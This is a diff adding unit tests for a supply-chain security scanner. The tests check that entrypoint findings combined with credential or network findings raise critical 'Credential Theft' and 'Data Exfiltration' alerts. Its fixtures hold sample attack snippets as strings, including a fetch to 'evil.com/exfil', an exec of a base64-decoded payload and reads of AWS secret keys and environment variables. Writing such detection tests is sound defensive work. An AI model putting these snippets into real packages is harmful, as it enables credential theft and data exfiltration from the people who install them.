@@ -585,6 +585,94 @@ class TestRule37GeofencedDestructive:
         assert not any("Geofenced" in c.title for c in correlated)
 
 
+class TestEntrypointCorrelation:
+    """Tests for Rules 40-41: entrypoint payload correlation."""
+
+    def test_entrypoint_iife_plus_env_access_fires_rule_40(self):
+        """Rule 40: entrypoint-iife + credential/env finding -> Credential Theft via require()."""
+        findings = [
+            core.Finding(scanner="entrypoint", severity="high",
+                title="IIFE Entrypoint Payload",
+                description="Immediately-invoked function expression at module entrypoint",
+                file="test.js", line=1,
+                snippet="(function(){})();",
+                category="entrypoint-iife"),
+            core.Finding(scanner="sast", severity="high",
+                title="Environment Variable Access",
+                description="process.env credential access detected",
+                file="test.js", line=5,
+                snippet="process.env.AWS_SECRET_ACCESS_KEY",
+                category="credential-access"),
+        ]
+        correlated = core.correlate(findings)
+        titles = [c.title for c in correlated]
+        assert "Supply Chain Entrypoint: Credential Theft via require()/import" in titles
+        rule40 = [c for c in correlated if c.title == "Supply Chain Entrypoint: Credential Theft via require()/import"]
+        assert rule40[0].severity == "critical"
+        assert rule40[0].category == "entrypoint-credential-chain"
+        assert rule40[0].file == "test.js"
+
+    def test_entrypoint_plus_network_fires_rule_41(self):
+        """Rule 41: entrypoint + network/fetch finding -> Data Exfiltration via require()."""
+        findings = [
+            core.Finding(scanner="entrypoint", severity="high",
+                title="Import-Time Exec Payload",
+                description="Code execution triggered at import/require entrypoint",
+                file="evil.js", line=1,
+                snippet="require('./payload')",
+                category="entrypoint-import-exec"),
+            core.Finding(scanner="sast", severity="high",
+                title="Outbound HTTP Fetch",
+                description="fetch() call to external network endpoint",
+                file="evil.js", line=8,
+                snippet="fetch('https://evil.com/exfil')",
+                category="network-call"),
+        ]
+        correlated = core.correlate(findings)
+        titles = [c.title for c in correlated]
+        assert "Supply Chain Entrypoint: Data Exfiltration via require()/import" in titles
+        rule41 = [c for c in correlated if c.title == "Supply Chain Entrypoint: Data Exfiltration via require()/import"]
+        assert rule41[0].severity == "critical"
+        assert rule41[0].category == "entrypoint-exfiltration-chain"
+        assert rule41[0].file == "evil.js"
+
+    def test_entrypoint_alone_no_correlation(self):
+        """Entrypoint finding without credential or network -> no Rules 40/41."""
+        findings = [
+            core.Finding(scanner="entrypoint", severity="high",
+                title="IIFE Entrypoint Payload",
+                description="Immediately-invoked function expression at module entrypoint",
+                file="index.js", line=1,
+                snippet="(function(){console.log('hi')})();",
+                category="entrypoint-iife"),
+        ]
+        correlated = core.correlate(findings)
+        assert not any("Entrypoint" in c.title for c in correlated)
+
+    def test_python_import_exec_plus_env_fires_rule_40(self):
+        """Rule 40: entrypoint-import-exec + os.environ access -> Credential Theft via require()."""
+        findings = [
+            core.Finding(scanner="entrypoint", severity="high",
+                title="Import-Time Code Execution",
+                description="Code executes at Python import via __init__.py entrypoint-import-exec pattern",
+                file="malicious/__init__.py", line=3,
+                snippet="exec(base64.b64decode(PAYLOAD))",
+                category="entrypoint-import-exec"),
+            core.Finding(scanner="sast", severity="medium",
+                title="Environment Variable Enumeration",
+                description="os.environ access reads all environment variables",
+                file="malicious/__init__.py", line=10,
+                snippet="os.environ.copy()",
+                category="env-access"),
+        ]
+        correlated = core.correlate(findings)
+        titles = [c.title for c in correlated]
+        assert "Supply Chain Entrypoint: Credential Theft via require()/import" in titles
+        rule40 = [c for c in correlated if c.title == "Supply Chain Entrypoint: Credential Theft via require()/import"]
+        assert rule40[0].severity == "critical"
+        assert rule40[0].file == "malicious/__init__.py"
+
+
 class TestRule38CIRunnerMemoryExtraction:
     """Tests for Rule 38: proc-mem-read + process-enumeration = CI Runner Memory Extraction."""
 
